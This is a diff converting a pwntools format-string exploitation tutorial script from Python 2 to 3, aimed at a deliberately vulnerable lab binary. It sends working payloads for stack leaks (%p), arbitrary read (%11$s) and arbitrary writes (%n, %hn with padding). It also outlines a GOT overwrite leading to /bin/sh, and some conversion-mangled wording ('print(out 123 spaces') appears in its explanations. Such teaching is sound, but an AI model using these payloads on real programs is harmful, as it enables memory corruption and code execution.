@@ -1,7 +1,7 @@
-#!/usr/bin/python
-import sys
-import time
+#!/usr/bin/env python3
 import argparse
+from pprint import pprint
+
 from pwn import *
 
 # setting 
@@ -11,6 +11,7 @@ context.endian = 'little'
 context.word_size = 32
 # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
 context.log_level = 'INFO'
+
 
 class bcolors:
     HEADER = '\033[95m'
@@ -24,72 +25,77 @@ class bcolors:
 
 
 def wait_for_prompt(r):
-  print r.recvuntil("Give me something to say!")
+    data = r.recvuntil(b"Give me something to say!")
+    print(data.decode('latin'))
+
 
 def get_addr(r):
-  addr = int(r.recvuntil(")")[:-1],16)
-  return addr
+    addr = int(r.recvuntil(b")")[:-1], 16)
+    return addr
+
 
 def wait_any_key():
-  raw_input("Press Enter to continue...")
+    input("Press Enter to continue...")
+
 
 def print_line():
-  print '-'*80
+    print('-' * 80)
 
-#--------------------------------------------------------------------------
+
+# --------------------------------------------------------------------------
 if __name__ == "__main__":
 
-  parser = argparse.ArgumentParser(description='Exploit the bins.')
-  parser.add_argument('--dbg'   , '-d', action="store_true")
-  parser.add_argument('--remote', '-r', action="store_true")
-  args = parser.parse_args()
+    parser = argparse.ArgumentParser(description='Exploit the bins.')
+    parser.add_argument('--dbg', '-d', action="store_true")
+    parser.add_argument('--remote', '-r', action="store_true")
+    args = parser.parse_args()
 
-  if args.remote:
-    r = remote('remote_server', 10103)
-  else:
-    r = process('./fsbplayground')
+    if args.remote:
+        r = remote('remote_server', 10103)
+    else:
+        r = process('./fsbplayground')
 
-  if args.dbg:
-    gdb.attach(r, """
+    if args.dbg:
+        gdb.attach(r, """
     b *main+334
     c
     """)
 
-  # ------------------------------------------------------------------------
-  # Known Addresses
-  GOT_EXIT = 0x804a020 
+    # ------------------------------------------------------------------------
+    # Known Addresses
+    GOT_EXIT = 0x804a020
 
-  # ------------------------------------------------------------------------
-  """
-  str_lower(0x804a03c): abcdefghijklmnopqrstuvwxyz
-  str_upper(0x804a058): ABCDEFGHIJKLMNOPQRSTUVWXYZ
-  command  (0x804a074): echo you just ran a command
-  g_intval (0x804a038): 0xaabbccdd
-  """
-  r.recvuntil("str_lower(0x")
-  addr_str_lower = get_addr(r)
-  r.recvuntil("str_upper(0x")
-  addr_str_upper = get_addr(r)
-  r.recvuntil("command  (0x")
-  addr_command = get_addr(r)
-  r.recvuntil("g_intval (0x")
-  addr_intval = get_addr(r)
-  r.recvuntil("g_intval2(0x")
-  addr_intval2 = get_addr(r)
+    # ------------------------------------------------------------------------
+    """
+    str_lower(0x804a03c): abcdefghijklmnopqrstuvwxyz
+    str_upper(0x804a058): ABCDEFGHIJKLMNOPQRSTUVWXYZ
+    command  (0x804a074): echo you just ran a command
+    g_intval (0x804a038): 0xaabbccdd
+    """
+    r.recvuntil(b"str_lower(0x")
+    addr_str_lower = get_addr(r)
+    r.recvuntil(b"str_upper(0x")
+    addr_str_upper = get_addr(r)
+    r.recvuntil(b"command  (0x")
+    addr_command = get_addr(r)
+    r.recvuntil(b"g_intval (0x")
+    addr_intval = get_addr(r)
+    r.recvuntil(b"g_intval2(0x")
+    addr_intval2 = get_addr(r)
 
-  wait_for_prompt(r)
-  r.clean()
-  
-  print bcolors.OKGREEN + "WELCOME to the FSB playground and showcase. We'll be walking through some examples of things that are possible with a FSB"
-  wait_any_key()
+    wait_for_prompt(r)
+    r.clean()
 
-  print_line()
-  print 'First lets look at where things are stored in memory'
-  r.sendline(' ')
-  wait_for_prompt(r)
-  print_line()
-  print bcolors.BOLD + 'Notice the address in the brackets, we will be using these to tell printf what to write where.'
-  print bcolors.OKBLUE + """
+    print(bcolors.OKGREEN + "WELCOME to the FSB playground and showcase. We'll be walking through some examples of things that are possible with a FSB")
+    wait_any_key()
+
+    print_line()
+    print('First lets look at where things are stored in memory')
+    r.sendline(b' ')
+    wait_for_prompt(r)
+    print_line()
+    print(bcolors.BOLD + 'Notice the address in the brackets, we will be using these to tell printf what to write where.')
+    print(bcolors.OKBLUE + """
    - First things first, lets try to understand what happens when a function is called in the code
    The arguments to the function are pushed to the stack and then the function is called.
    So doing a printf("%d %d %d", 1, 2, 3); will push 4 values to the stack
@@ -118,14 +124,14 @@ if __name__ == "__main__":
    For example. If we pass the following string to our vulnerable input: "AAAA %p %p %p %p %p %p %p %p %p %p %p %p"
    We start off with a placeholder that is easily recognizable "AAAA" and then a bunch of prints for pointers. 
    Lets send that now:
-  """
-  wait_any_key()
-  r.clean()
+    """)
+    wait_any_key()
+    r.clean()
 
-  r.sendline("AAAA %p %p %p %p %p %p %p %p %p %p %p %p")
-  wait_for_prompt(r)
-  
-  print bcolors.OKBLUE + """
+    r.sendline(b"AAAA %p %p %p %p %p %p %p %p %p %p %p %p")
+    wait_for_prompt(r)
+
+    print(bcolors.OKBLUE + """
     You should be able to see the AAAA and then a number of hex numbers printed out. Each value is a value on the stack. 
     If you look at position 11 you should see a 0x41414141. This is the hex value for AAAA
     This means that we have found the location on the stack where our input string is being stored.
@@ -136,47 +142,41 @@ if __name__ == "__main__":
     We can read out that specfic stack location by using the argument '%11$p'. This means the 11th stack item, printed as a pointer.
 
     So lets feed it the input string "AAAA%11$p" this should result in the output of "AAAA0x41414141"
-  """ 
-  wait_any_key()
-  r.sendline("AAAA%11$p")
-  wait_for_prompt(r)
+    """)
+    wait_any_key()
+    r.sendline(b"AAAA%11$p")
+    wait_for_prompt(r)
 
-
-
-
-  byte4 = addr_str_upper & 0xff
-  byte3 = (addr_str_upper >> 8) & 0xff
-  byte2 = (addr_str_upper >> 16) & 0xff
-  byte1 = (addr_str_upper >> 24) & 0xff
-  print bcolors.OKBLUE + """
+    byte4 = addr_str_upper & 0xff
+    byte3 = (addr_str_upper >> 8) & 0xff
+    byte2 = (addr_str_upper >> 16) & 0xff
+    byte1 = (addr_str_upper >> 24) & 0xff
+    print(bcolors.OKBLUE + f"""
     Great. So that should have worked. So what does that all mean? How is that useful??
 
-    So you can print a certain stack value. Big deal right???
+    So you can print(a certain stack value. Big deal right???
 
     Well we should now be able to use that to give us an arbitrary read primitive. 
     What about the string in memory that contains the uppercase characters.. This could be the location of a super secret passphrase
     Or the address of a library that is loaded at a random location. But would be really useful to know (when we're not supposed to)
 
-    So we know the address of the string. In this case: {} .
-    So lets format our input string like this: '/x{}/x{}/x{}/x{} The String is:%11$s' (via a python print statement, in order to send the raw bytes)
+    So we know the address of the string. In this case: {hex(addr_str_upper)} .
+    So lets format our input string like this: '/x{hex(byte4)[2:]}/x{hex(byte3)[2:]}/x{hex(byte2)[2:]}/x{hex(byte1)[2:]} The String is:%11$s' (via a python print(statement, in order to send the raw bytes)
     
     This should result in the str_upper string being printed out.
     This works because we're telling printf to use the pointer at the 11th stack location as the string
-  """.format(hex(addr_str_upper), hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:])
+    """)
 
-  wait_any_key()
-  r.sendline(p32(addr_str_upper) + ' The String is:%11$s')
-  wait_for_prompt(r)
+    wait_any_key()
+    r.sendline(p32(addr_str_upper) + b' The String is:%11$s')
+    wait_for_prompt(r)
 
+    byte4 = addr_intval & 0xff
+    byte3 = (addr_intval >> 8) & 0xff
+    byte2 = (addr_intval >> 16) & 0xff
+    byte1 = (addr_intval >> 24) & 0xff
 
-  
-
-  byte4 = addr_intval & 0xff
-  byte3 = (addr_intval >> 8) & 0xff
-  byte2 = (addr_intval >> 16) & 0xff
-  byte1 = (addr_intval >> 24) & 0xff
-
-  print bcolors.OKBLUE + """
+    print(bcolors.OKBLUE + f"""
  
     Now we have learned a super useful 'read memory from anywhere' trick. What about writing?
 
@@ -190,66 +190,60 @@ if __name__ == "__main__":
 
     This gives us a useful write primitive to write arbitrary memory locations. This is really powerful!
 
-    If we take the address of g_intval {} and set that as our first 4 bytes, and then do a %n, we should see g_intval change to 0x4
+    If we take the address of g_intval {hex(addr_intval)} and set that as our first 4 bytes, and then do a %n, we should see g_intval change to 0x4
 
-    Lets try sending '/x{}/x{}/x{}/x{}%11$n' (via a python print statement, in order to send the raw bytes)
+    Lets try sending '/x{hex(byte4)[2:]}/x{hex(byte3)[2:]}/x{hex(byte2)[2:]}/x{hex(byte1)[2:]}%11$n' (via a python print(statement, in order to send the raw bytes)
 
-  """.format(hex(addr_intval), hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:])
+    """)
 
-  wait_any_key()
-  r.sendline(p32(addr_intval) + '%11$n')
-  wait_for_prompt(r)
+    wait_any_key()
+    r.sendline(p32(addr_intval) + b'%11$n')
+    wait_for_prompt(r)
 
+    byte4 = addr_intval2 & 0xff
+    byte3 = (addr_intval2 >> 8) & 0xff
+    byte2 = (addr_intval2 >> 16) & 0xff
+    byte1 = (addr_intval2 >> 24) & 0xff
 
-
-
-
-  byte4 = addr_intval2 & 0xff
-  byte3 = (addr_intval2 >> 8) & 0xff
-  byte2 = (addr_intval2 >> 16) & 0xff
-  byte1 = (addr_intval2 >> 24) & 0xff
-
-  print bcolors.OKBLUE + """
+    print(bcolors.OKBLUE + f"""
     You should now see that the value of g_intval went from 0xaabbccdd to 0x4.
     But this means that we overwrote the whole 32 bits. What about if we want to preserve the first 2bytes of the address?
 
     Well we can do that with: %hn which will only write 2 bytes.
     
-    If we take the address of g_intval2 {} and set that as our 11th stack position and write the number of written bytes with %hn...     
-    Lets try sending '/x{}/x{}/x{}/x{}%11$hn'
+    If we take the address of g_intval2 {hex(addr_intval2)} and set that as our 11th stack position and write the number of written bytes with %hn...     
+    Lets try sending '/x{hex(byte4)[2:]}/x{hex(byte3)[2:]}/x{hex(byte2)[2:]}/x{hex(byte1)[2:]}%11$hn'
 
-  """.format(hex(addr_intval2), hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:])
-  wait_any_key()
-  r.sendline(p32(addr_intval2) + '%11$hn')
-  wait_for_prompt(r)
-  
-  print bcolors.OKBLUE + """
+    """)
+    wait_any_key()
+    r.sendline(p32(addr_intval2) + b'%11$hn')
+    wait_for_prompt(r)
+
+    print(bcolors.OKBLUE + f"""
     You should see that the value of g_intval2 is now: 0x11220004.
 
     But what if we want to write a bigger number? We could do something like '\xaa\xaa\xaa\xaa1234%11$n' and the value of 8 would be written.
     But that is problematic since we only have a buffer of 64bytes. How do we do values of more than 64 bytes in this case?
 
-    Introducing the '%123c' argument... This will print out 123 spaces. %800c will print out 800 spaces. This is a huge help.
+    Introducing the '%123c' argument... This will print(out 123 spaces. %800c will print(out 800 spaces. This is a huge help.
 
     So if we want to restore the original value of g_intval2 the lower 2 bytes need to be 0x3344. This means we can format an input like this:
-    '/x{}/x{}/x{}/x{}%13120c%11$n'
+    '/x{hex(byte4)[2:]}/x{hex(byte3)[2:]}/x{hex(byte2)[2:]}/x{hex(byte1)[2:]}%13120c%11$n'
 
     Some explaination is probably needed. We take 0x3344 and convert that to decimal: 13124. 
     We then need to subtract the number of bytes that have already been written, in this case 4, since the address is 4 bytes.
 
     Lets try that. NOTE: You'd usually see a WHOLE bunch of spaces... 13120 to be exact. For this example I've take those away
 
-  """.format( hex(byte4)[2:], hex(byte3)[2:], hex(byte2)[2:], hex(byte1)[2:] )
-  wait_any_key()
-  r.sendline(p32(addr_intval2) + '%13120c%11$hn')
-  r.clean()
+    """)
+    wait_any_key()
+    r.sendline(p32(addr_intval2) + b'%13120c%11$hn')
+    r.clean()
 
-
-
-  print bcolors.BOLD + "Lets look at the values now"
-  print r.sendline(' ')
-  wait_for_prompt(r)
-  print bcolors.OKBLUE + """
+    print(bcolors.BOLD + "Lets look at the values now")
+    print(r.sendline(b' '))
+    wait_for_prompt(r)
+    print(bcolors.OKBLUE + """
     The value of g_intval2 should now be 0x11223344 again.
 
     Now we have a very powerful ability to write values to any writable location in memory. WOW. So what can we do with this power?
@@ -261,8 +255,7 @@ if __name__ == "__main__":
      1 - Updating the exit() pointer in the GOT to point to the hidden() function instead
      2 - Update the command string to say "/bin/sh;" instead
      3 - Give an empty input to break out of the while loop and call exit().
-  """
+     """)
 
-  # Drop to interactive console
-  r.interactive()
-
+    # Drop to interactive console
+    r.interactive()
